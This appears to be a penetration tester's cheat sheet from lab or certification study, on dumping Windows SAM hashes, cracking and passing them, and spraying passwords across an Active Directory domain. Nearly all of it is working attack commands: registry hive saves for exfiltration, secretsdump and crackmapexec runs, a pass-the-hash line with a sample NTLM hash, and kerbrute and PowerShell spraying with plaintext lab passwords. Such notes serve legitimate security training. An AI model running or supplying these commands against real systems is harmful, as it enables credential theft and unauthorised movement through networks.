# Hash Dumping

### SAM Dumping

```
Dumping the SAM hashes on Victim

reg save hklm\system system
reg save hklm\sam sam

-> Exfiltrate to our Kali machine and use a tool called samdump2 or powershell or mimikatz.

# Methods, not everytime hashes are crackable.
1) impacket-secretsdump -sam sam -system system -security security local # BEST
2) cp /usr/bin/samdump2 .
samdump2 system sam # Less Reliable
3) crackmapexec smb <IP> -u <user> -p <pass> --sam
```

### SAM Hash Cracking

```
# Put DC IP or IP where you want to Pivot, the user is from SAM hash, Modify the hash and remove dots and name.

crackmapexec smb <IP> -u <user> -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
```

### Other Notes

```

xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
net accounts

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

cd C:\Tools
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin


cat users.txt
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success


crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com

type .\usernames.txt
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"


Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```